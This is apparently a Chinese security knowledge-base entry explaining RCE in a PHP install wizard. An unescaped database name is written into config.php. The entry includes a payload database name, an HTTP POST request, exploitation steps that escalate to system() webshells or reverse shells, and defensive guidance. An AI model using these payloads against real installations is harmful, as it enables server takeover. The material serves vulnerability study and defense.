---
id: web-php-rce-install-config-unescaped-dbname
title: 安装向导未转义数据库名写入 config.php 导致代码执行
type: scenario
domain: web
path: web/php/rce
technique: php-installer-config-injection
aliases:
- 安装文件写配置 RCE
- dbName 代码注入
- config.php 配置写入 RCE
- install/call.php 代码执行
- 未删安装目录 getshell
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
tags:
- php
- rce
- installer
- config-injection
- file-write
- code-injection
cve: []
verification:
  verified_by: verifier-V8
  verified_at: '2026-11-05T00:34:18+08:00'
  notes: 已对照原文与图 17-21 核对：install/call.php 将  参数直接拼进 PHP 配置并用 file_put_contents 写入、未检查安装锁、创建 db';phpinfo();?> 库名后访问 config.php 执行 phpinfo（PHP 7.3.4），均与原文一致；PoC 未在本机复现。
---

## 一句话结论

Web 安装向导 `/install/call.php` 把用户 POST 的数据库名等参数直接拼进 PHP 配置文件字符串，再用 `file_put_contents` 写入 `config.php`；由于没有转义、也没有检查安装锁，攻击者可创建一个名称含 `';phpinfo();?>` 的数据库并提交安装请求，使写入的配置文件中闭合单引号并执行任意 PHP 代码，访问 `config.php` 即触发 RCE。

## 原理

- 安装流程会把数据库连接参数写入配置文件，典型实现是用字符串拼接生成 PHP 代码：
  ```php
  $ncc = "<?php
  \$db_host = '$dbHost';
  \$db_user = '$dbUsername';
  \$db_pass = '$dbPassword';
  \$db_name = '$dbName';
  ?>";
  file_put_contents($linkf, $ncc);
  ```
  `$dbName` 等变量直接来自 `$_POST`，没有 `addslashes`/`var_export`/白名单校验。
- PHP 单引号字符串中，攻击者提交 `db';phpinfo();?>` 会让生成的配置变成：
  ```php
  $db_name = 'db';phpinfo();?>';
  ```
  第一个 `'` 闭合字符串，`;` 结束语句，`phpinfo();` 作为新语句执行，`?>` 退出 PHP 模式，剩余内容成为输出文本；文件本身是合法的 PHP 代码。
- 安装脚本通常还会先连接数据库并导入 `install.sql`，因此攻击者需要先创建一个名称包含 payload 的数据库（MySQL 允许用反引号引用含特殊字符的库名，原文在 Navicat 中创建成功）。
- 关键前置缺陷是**安装锁缺失**：`call.php` 没有检查 `install.lock` 或类似标记，安装完成后仍可被匿名调用，属于前台无条件利用；若安装目录未删除，攻击面持续存在。
- 与 SQL 注入不同，这里不需要数据库返回数据，危险点在“把不可信字符串当代码写入可执行文件”。

## 触发条件

1. 目标存在 Web 安装向导（如 `/install/call.php`），安装完成后未删除或未加锁。
2. 安装接口接受 `dbHost`、`dbName`、`dbUsername`、`dbPassword` 等 POST 参数，并写入 PHP 配置文件。
3. 写入时未转义、未使用 `var_export` 或模板占位符。
4. 攻击者能创建一个名称包含 payload 的数据库（或目标 DB 允许此类标识符），且安装流程能连接该库完成后续写入。
5. `config.php` 位于 Web 可访问目录，或能被包含执行。

## 利用步骤

1. 确认安装目录可访问，`call.php` 未校验安装锁。
2. 在数据库服务器上创建一个名称含 payload 的库，例如 ``db';phpinfo();?>``（必要时用反引号引用）。
3. 向 `/install/call.php` 提交安装参数，`dbName` 填该库名，其余参数指向可连接的数据库。
4. 安装脚本导入 SQL 后拼接并写入 `config.php`，payload 进入配置文件。
5. 访问 `/config.php`，`phpinfo()` 执行，证明代码执行。
6. 将 `phpinfo()` 替换为 `system($_GET['c'])`、写 WebShell 或反弹 Shell 等载荷，进一步控制服务器。

## PoC

创建的数据库名：

```text
db';phpinfo();?>
```

生成的 `config.php` 片段：

```php
<?php
$db_host = '127.0.0.1';
$db_user = 'root';
$db_pass = 'root';
$db_name = 'db';phpinfo();?>';
?>
```

请求示意：

```http
POST /install/call.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

dbHost=127.0.0.1&dbName=db';phpinfo();?>&dbUsername=root&dbPassword=root
```

访问 `http://target/config.php` 返回 PHP 信息页（原文实测 PHP 7.3.4），证明配置文件中的代码被执行。

## 变体与关联

- 同类写入点还包括：安装时的站点 URL、管理员账号、表前缀等参数；只要进入配置文件且未转义，都可注入。
- 即使安装锁存在，若锁文件路径可预测/可删除，或安装目录可重命名访问，也可能重新触发。
- 与“日志写入 WebShell”“Session 文件包含”同属“把可控内容写入可执行文件”的 RCE 模式，区别是这里写入的是 PHP 配置。
- 若配置文件不可直接访问，可通过 LFI 包含 `config.php` 触发。

## 检测与防御

- 安装完成后立即删除 `install/` 目录或设置安装锁，并在安装入口强制检查锁文件。
- 写配置时使用 `var_export($value, true)`、参数化模板或白名单校验（数据库名只允许 `[A-Za-z0-9_]+`），禁止字符串拼接。
- 配置文件放在 Web 根目录之外，或通过 Web 服务器规则禁止直接访问 `.php` 配置目录。
- 代码审计搜索 `file_put_contents` + 双引号拼接 `$_POST` 的配置写入点，以及 `install`/`setup` 目录的访问控制。
- 监控 Web 目录中 `config.php` 等文件的创建/修改，以及异常数据库名（含引号、`?>`、分号）。
